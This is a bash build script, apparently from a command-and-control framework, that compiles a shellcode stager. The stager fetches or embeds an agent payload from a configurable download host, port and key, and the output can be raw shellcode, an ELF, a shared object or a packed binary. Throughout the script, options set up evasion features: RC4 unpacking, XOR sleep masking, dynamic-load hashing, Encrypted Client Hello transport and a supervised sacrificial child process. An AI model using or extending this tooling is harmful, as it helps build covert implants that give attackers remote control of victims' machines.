#!/bin/bash
set -e

# Default configuration values
STAGER_FORMAT="shellcode"
TRANSPORT="http"
DOWNLOAD_HOST="127.0.0.1"
DOWNLOAD_PORT="8000"
DOWNLOAD_PATH="/"
DOWNLOAD_KEY=""
PAYLOAD="download"
PAYLOAD_FILE=""
UNPACKER="rc4"
MASK="xor"
DYNLOAD_MODE="public"
HASH_STYLE="auto"
ECH="off"
ECH_CONFIG=""
SUPERVISE="0"
SUPERVISE_SLEEP_MIN="5"
SUPERVISE_SLEEP_MAX="30"

DEBUG_FLAG=""

# Parse command line flags passed by modcustom.go (e.g. --download-host 192.168.1.10)
while [[ $# -gt 0 ]]; do
  case "$1" in
  --debug)
    DEBUG_FLAG="DEBUG=1"
    shift 1
    ;;
  --stager-format | --stager_format)
    STAGER_FORMAT="$2"
    shift 2
    ;;
  --transport)
    TRANSPORT="$2"
    shift 2
    ;;
  --download-host | --download_host)
    DOWNLOAD_HOST="$2"
    shift 2
    ;;
  --download-port | --download_port)
    DOWNLOAD_PORT="$2"
    shift 2
    ;;
  --download-path | --download_path)
    DOWNLOAD_PATH="$2"
    shift 2
    ;;
  --download-key | --download_key)
    DOWNLOAD_KEY="$2"
    shift 2
    ;;
  --payload-source | --payload_source)
    PAYLOAD="$2"
    shift 2
    ;;
  --payload-file | --payload_file)
    PAYLOAD_FILE="$2"
    shift 2
    ;;
  --unpacker)
    UNPACKER="$2"
    shift 2
    ;;
  --mask)
    MASK="$2"
    shift 2
    ;;
  --dynload-mode | --dynload_mode)
    DYNLOAD_MODE="$2"
    shift 2
    ;;
  --hash-style | --hash_style)
    HASH_STYLE="$2"
    shift 2
    ;;
  --ech)
    ECH="$2"
    shift 2
    ;;
  --ech-config | --ech_config)
    ECH_CONFIG="$2"
    shift 2
    ;;
  --supervise)
    SUPERVISE="$2"
    shift 2
    ;;
  --supervise-sleep-min | --supervise_sleep_min)
    SUPERVISE_SLEEP_MIN="$2"
    shift 2
    ;;
  --supervise-sleep-max | --supervise_sleep_max)
    SUPERVISE_SLEEP_MAX="$2"
    shift 2
    ;;
  *)
    # Handle --key=value style arguments if passed
    if [[ "$1" == --*=* ]]; then
      opt="${1%%=*}"
      val="${1#*=}"
      case "$opt" in
      --debug) DEBUG_FLAG="DEBUG=1" ;;
      --stager-format | --stager_format) STAGER_FORMAT="$val" ;;
      --transport) TRANSPORT="$val" ;;
      --download-host | --download_host) DOWNLOAD_HOST="$val" ;;
      --download-port | --download_port) DOWNLOAD_PORT="$val" ;;
      --download-path | --download_path) DOWNLOAD_PATH="$val" ;;
      --download-key | --download_key) DOWNLOAD_KEY="$val" ;;
      --payload-source | --payload_source) PAYLOAD="$val" ;;
      --payload-file | --payload_file) PAYLOAD_FILE="$val" ;;
      --unpacker) UNPACKER="$val" ;;
      --mask) MASK="$val" ;;
      --dynload-mode | --dynload_mode) DYNLOAD_MODE="$val" ;;
      --hash-style | --hash_style) HASH_STYLE="$val" ;;
      --ech) ECH="$val" ;;
      --ech-config | --ech_config) ECH_CONFIG="$val" ;;
      --supervise) SUPERVISE="$val" ;;
      --supervise-sleep-min | --supervise_sleep_min) SUPERVISE_SLEEP_MIN="$val" ;;
      --supervise-sleep-max | --supervise_sleep_max) SUPERVISE_SLEEP_MAX="$val" ;;
      esac
      shift 1
    else
      shift 1
    fi
    ;;
  esac
done

echo "[+] Building shellcode stager with options:"
echo "    Format:        $STAGER_FORMAT"
echo "    Transport:     $TRANSPORT"
echo "    Unpacker:      $UNPACKER"
echo "    Sleep Mask:    $MASK"
echo "    Dynload Mode:  $DYNLOAD_MODE"
echo "    Hash Style:    $HASH_STYLE"
echo "    Download Host: $DOWNLOAD_HOST"
echo "    Download Port: $DOWNLOAD_PORT"
echo "    Download Path: $DOWNLOAD_PATH"
echo "    Download Key:  [SET]"
echo "    Payload:       $PAYLOAD"
if [[ "$PAYLOAD" == "local" ]]; then
  echo "    Payload File:  ${PAYLOAD_FILE:-[MISSING]}"
fi
# ECH only affects the libssl transport; ignored by the raw-socket transports.
case "$ECH" in 1|on|true|yes) ECH_ENABLE=1 ;; *) ECH_ENABLE=0 ;; esac
echo "    ECH:           $ECH (libssl transport only)"

# Supervision runs the agent PIC in a sacrificial child and caches its
# ephemeral identity key across restarts. Accept on/off-style values.
case "$SUPERVISE" in 1|on|true|yes) SUPERVISE_ENABLE=1 ;; *) SUPERVISE_ENABLE=0 ;; esac
echo "    Supervise:     $SUPERVISE"

case "$PAYLOAD" in
download | local) ;;
*)
  echo "[-] Unsupported payload source: $PAYLOAD (use download or local)" >&2
  exit 1
  ;;
esac
if [[ "$PAYLOAD" == "local" && ! -f "$PAYLOAD_FILE" ]]; then
  echo "[-] payload-source=local requires --payload-file <prebuilt C agent PIC>" >&2
  exit 1
fi

# Clean previous build artifacts
make clean

# Determine build target based on requested stager format from config.json choices
MAKE_TARGET="raw"
case "$STAGER_FORMAT" in
  so|shared)
    MAKE_TARGET="so"
    ;;
  executable|elf)
    MAKE_TARGET="executable"
    ;;
  packed)
    MAKE_TARGET="packed"
    ;;
  raw|shellcode|"")
    MAKE_TARGET="raw"
    ;;
  *)
    MAKE_TARGET="raw"
    ;;
esac

# Build using Makefile
make "$MAKE_TARGET" $DEBUG_FLAG \
  DOWNLOAD_HOST="$DOWNLOAD_HOST" \
  DOWNLOAD_PORT="$DOWNLOAD_PORT" \
  DOWNLOAD_PATH="$DOWNLOAD_PATH" \
  DOWNLOAD_KEY="$DOWNLOAD_KEY" \
  PAYLOAD="$PAYLOAD" \
  PAYLOAD_FILE="$PAYLOAD_FILE" \
  TRANSPORT="$TRANSPORT" \
  UNPACKER="$UNPACKER" \
  MASK="$MASK" \
  DYNLOAD_MODE="$DYNLOAD_MODE" \
  HASH_STYLE="$HASH_STYLE" \
  ECH="$ECH_ENABLE" \
  ECH_CONFIG="$ECH_CONFIG" \
  SUPERVISE="$SUPERVISE_ENABLE" \
  SUPERVISE_SLEEP_MIN="$SUPERVISE_SLEEP_MIN" \
  SUPERVISE_SLEEP_MAX="$SUPERVISE_SLEEP_MAX"

case "$MAKE_TARGET" in
raw) ARTIFACT="stager.bin" ;;
executable) ARTIFACT="stager" ;;
so) ARTIFACT="stager.so" ;;
packed) ARTIFACT="stager-packed.bin" ;;
esac
if [[ ! -f "$ARTIFACT" ]]; then
  echo "[-] build finished without producing $ARTIFACT" >&2
  exit 1
fi

echo "[+] Stager build complete."
printf '[+] generated payload: %s (%s bytes)\n' "$(pwd)/$ARTIFACT" "$(wc -c <"$ARTIFACT" | tr -d '[:space:]')"
